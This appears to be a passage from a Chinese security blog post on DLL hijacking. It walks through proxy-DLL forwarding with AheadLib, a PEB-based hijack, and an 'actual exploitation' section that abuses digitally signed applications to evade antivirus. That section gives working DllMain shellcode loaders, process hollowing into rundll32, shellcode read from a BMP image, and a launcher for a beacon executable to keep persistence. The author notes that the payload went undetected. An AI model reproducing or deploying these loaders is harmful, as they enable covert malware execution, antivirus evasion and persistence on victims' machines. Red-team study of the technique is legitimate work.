+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010341471.png" alt="image-20220823010341471"></p>
+<p>加载原始dll文件后调用 InitializeAddresses</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010409242.png" alt="image-20220823010409242"></p>
+<p>InitializeAddresses 获取原函数地址</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010504677.png" alt="image-20220823010504677"></p>
+<p>当通过调用函数时，进行转发到 _AheadLib_Scintilla_DirectFunction</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;_AheadLib_Scintilla_DirectFunction,@1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这个就是通过上面的原函数地址进行跳转调用</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010612582.png" alt="image-20220823010612582"></p>
+<p>效果：payload执行并且不影响正常使用</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010231062.png" alt="image-20220823010231062"></p>
+<h2 id="一种更加通用的方式"><a href="#一种更加通用的方式" class="headerlink" title="一种更加通用的方式"></a>一种更加通用的方式</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248050-1.htm">一种通用DLL劫持技术研究-编程技术-看雪论坛</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* NtCurrentPeb()</span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[0x30];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">PEB_LDR_DATA* NtGetPebLdr(void* peb)</span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, peb;</span><br><span class="line">        mov eax, [eax + 0xc];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line">    WCHAR wszDllName[100] &#x3D; &#123; 0 &#125;;</span><br><span class="line">    void* peb &#x3D; NtCurrentPeb();</span><br><span class="line">    PEB_LDR_DATA* ldr &#x3D; NtGetPebLdr(peb);</span><br><span class="line"> </span><br><span class="line">    for (LIST_ENTRY* entry &#x3D; ldr-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line">        entry !&#x3D; (LIST_ENTRY*)(&amp;ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">        entry &#x3D; entry-&gt;Blink) &#123;</span><br><span class="line">        PLDR_DATA_TABLE_ENTRY data &#x3D; (PLDR_DATA_TABLE_ENTRY)entry;</span><br><span class="line"> </span><br><span class="line">        memset(wszDllName, 0, 100 * 2);</span><br><span class="line">        memcpy(wszDllName, data-&gt;BaseDllName.Buffer, data-&gt;BaseDllName.Length);</span><br><span class="line"> </span><br><span class="line">        if (!_wcsicmp(wszDllName, dllname)) &#123;</span><br><span class="line">            data-&gt;DllBase &#x3D; hMod;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID DllHijack(HMODULE hMod)</span><br><span class="line">&#123;</span><br><span class="line">    TCHAR tszDllPath[MAX_PATH] &#x3D; &#123; 0 &#125;;</span><br><span class="line"> </span><br><span class="line">    GetModuleFileName(hMod, tszDllPath, MAX_PATH);</span><br><span class="line">    PathRemoveFileSpec(tszDllPath);</span><br><span class="line">    PathAppend(tszDllPath, TEXT(&quot;mydll.dll.1&quot;));</span><br><span class="line"> </span><br><span class="line">    HMODULE hMod1 &#x3D; LoadLibrary(tszDllPath);</span><br><span class="line"> </span><br><span class="line">    SuperDllHijack(L&quot;mydll.dll&quot;, hMod1);</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        DllHijack(hModule);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是本地库函里参数变更，没法实验。</p>
+<h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><h2 id="白加黑"><a href="#白加黑" class="headerlink" title="白加黑"></a>白加黑</h2><p>杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而执行恶意代码。</p>
+<h2 id="DLL加载上线"><a href="#DLL加载上线" class="headerlink" title="DLL加载上线"></a>DLL加载上线</h2><p>生成shellcode</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823233332667.png" alt="image-20220823233332667"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 入口函数</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">    if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">        unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">        size_t size &#x3D; sizeof(buf);</span><br><span class="line">        char* inject &#x3D; (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        memcpy(inject, buf, size);</span><br><span class="line">        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没做免杀，会报毒，而且这里利用线程去加载shellcode，当qq退出时就会下线，通过dll注入技术，注入迁移到其他进程</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/325873.html">深入理解反射式dll注入技术 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cody_Ren/article/details/100053434">DLL注入的8种姿势_dajiiii的博客dll注入</a></p>
+<p>这里借鉴一下其他师傅的注入代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 入口函数</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		DisableThreadLibraryCalls(hModule);</span><br><span class="line">		unsigned char hexData[] &#x3D; &quot;(shellcode)&quot;;</span><br><span class="line">		char* v7A &#x3D; (char*)VirtualAlloc(0, _countof(hexData),0x3000u, 0x40u);</span><br><span class="line">		memcpy((void*)v7A, hexData, _countof(hexData));</span><br><span class="line">		struct _PROCESS_INFORMATION ProcessInformation;</span><br><span class="line">		struct _STARTUPINFOA StartupInfo;</span><br><span class="line">		void* v24;</span><br><span class="line">		CONTEXT Context;</span><br><span class="line">		DWORD DwWrite &#x3D; 0;</span><br><span class="line">		memset(&amp;StartupInfo, 0, sizeof(StartupInfo));</span><br><span class="line">		StartupInfo.cb &#x3D; 68;</span><br><span class="line">		BOOL result &#x3D; CreateProcessA(0,(LPSTR)&quot;rundll32.exe&quot;, 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,&amp;ProcessInformation);</span><br><span class="line">		if (result)</span><br><span class="line">		&#123;</span><br><span class="line">			Context.ContextFlags &#x3D; 65539;</span><br><span class="line">			GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">			v24 &#x3D; VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);</span><br><span class="line">			WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class="line">			Context.Eip &#x3D; (DWORD)v24;</span><br><span class="line">			SetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">			ResumeThread(ProcessInformation.hThread);</span><br><span class="line">			CloseHandle(ProcessInformation.hThread);</span><br><span class="line">			result &#x3D; CloseHandle(ProcessInformation.hProcess);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入成功，关闭QQ也可达到权限维持目的</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824010754724.png" alt="image-20220824010754724"></p>
+<p>而且shellcode没有做免杀竟然没有报毒</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824012022017.png" alt="image-20220824012022017"></p>
+<p>还有搭配图片的，项目地址：<a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/DKMC">DKMC - Dont kill my cat - Malicious payload evasion tool</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 入口函数</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		DisableThreadLibraryCalls(hModule);</span><br><span class="line">		FILE* fp; &#x2F;&#x2F; 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span><br><span class="line">		size_t size; &#x2F;&#x2F; 定义文件字节数变量size</span><br><span class="line">		unsigned char* buffer; &#x2F;&#x2F; 定义缓存指针变量</span><br><span class="line">		fp &#x3D; fopen(&quot;cloudmusic.bmp&quot;, &quot;rb&quot;);&#x2F;&#x2F; fseek()负号前移，正号后移</span><br><span class="line">		fseek(fp, 0, SEEK_END); &#x2F;&#x2F; 文件指针指向文件末尾</span><br><span class="line">		&#x2F;&#x2F; ftell()返回给定流 stream 的当前文件位置</span><br><span class="line">		size &#x3D; ftell(fp); &#x2F;&#x2F; size值为文件大小</span><br><span class="line">		fseek(fp, 0, SEEK_SET); &#x2F;&#x2F; 文件指针指向文件开头</span><br><span class="line">		buffer &#x3D; (unsigned char*)malloc(size); &#x2F;&#x2F; 动态申请图片大小的内存空间（数组指针）</span><br><span class="line">		fread(buffer, size, 1, fp); &#x2F;&#x2F; 从fp读取和显示1个size大小的数据</span><br><span class="line">		char* v7A &#x3D; (char*)VirtualAlloc(0, _countof(hexData),0x3000u, 0x40u);</span><br><span class="line">		memcpy((void*)v7A, hexData, _countof(hexData));</span><br><span class="line">		struct _PROCESS_INFORMATION ProcessInformation;</span><br><span class="line">		struct _STARTUPINFOA StartupInfo;</span><br><span class="line">		void* v24;</span><br><span class="line">		CONTEXT Context;</span><br><span class="line">		DWORD DwWrite &#x3D; 0;</span><br><span class="line">		memset(&amp;StartupInfo, 0, sizeof(StartupInfo));</span><br><span class="line">		StartupInfo.cb &#x3D; 68;</span><br><span class="line">		BOOL result &#x3D; CreateProcessA(0,(LPSTR)&quot;rundll32.exe&quot;, 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,&amp;ProcessInformation);</span><br><span class="line">		if (result)</span><br><span class="line">		&#123;</span><br><span class="line">			Context.ContextFlags &#x3D; 65539;</span><br><span class="line">			GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">			v24 &#x3D; VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);</span><br><span class="line">			WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class="line">			Context.Eip &#x3D; (DWORD)v24;</span><br><span class="line">			SetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">			ResumeThread(ProcessInformation.hThread);</span><br><span class="line">			CloseHandle(ProcessInformation.hThread);</span><br><span class="line">			result &#x3D; CloseHandle(ProcessInformation.hProcess);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件关联程序DLL劫持"><a href="#文件关联程序DLL劫持" class="headerlink" title="文件关联程序DLL劫持"></a>文件关联程序DLL劫持</h2><p>挖掘默认文件相关联应用程序存不存在dll劫持，比如打开图片，默认为某种看图软件，当双击图片便加载dll</p>
+<h2 id="加载exe"><a href="#加载exe" class="headerlink" title="加载exe"></a>加载exe</h2><p>上传一个exe(做好免杀)，dll加载去执行远控木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 入口函数</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">    if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class="line">    &#123;</span><br><span class="line">        STARTUPINFO si &#x3D; &#123; sizeof(si) &#125;;</span><br><span class="line">        PROCESS_INFORMATION pi;</span><br><span class="line">        CreateProcess(TEXT(&quot;C:\\Users\\win7\\Desktop\\shellcode\\beacon.exe&quot;), NULL, NULL, NULL, false, 0, NULL, NULL, &amp;si, &amp;pi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这部分就是关于windows提权中的设置，感觉多是一些CVE等。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>文章-基础</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225911">DLL劫持原理及其漏洞挖掘（一）</a></li>
+<li><a target="_blank" rel="noopener" href="https://yanghaoi.github.io/2021/11/18/dll-jie-chi-lou-dong/">DLL劫持漏洞 | Yang Hao’s blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lidabo/archive/2013/11/20/3434005.html">DLL编写教程(绝对经典之作)</a></li>
+</ul>
+<p>文章-提升</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232891">DLL劫持之权限维持篇（二）</a></li>
+<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248050.htm">一种通用DLL劫持技术研究</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10143">golang实现dll恶意劫持转发</a></li>
+</ul>
+<p>视频</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1S4411e7Mc">https://www.bilibili.com/video/BV1S4411e7Mc</a></li>
+</ul>
+<p>Attack</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://payloads.online/archivers/2018-06-09/1/">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a></li>
+<li><a target="_blank" rel="noopener" href="http://payloads.online/archivers/2018-08-15/1/">Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现</a></li>
+</ul>
+<p>用到的工具</p>
+<ul>
+<li>Rattler</li>
+<li>Aheadlib</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/11/07/java-dll/" rel="prev" title="初探java加载动态链接库">
+                  <i class="fa fa-angle-left"></i> 初探java加载动态链接库
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/11/07/%E9%92%93%E9%B1%BC/" rel="next" title="钓鱼">
+                  钓鱼 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
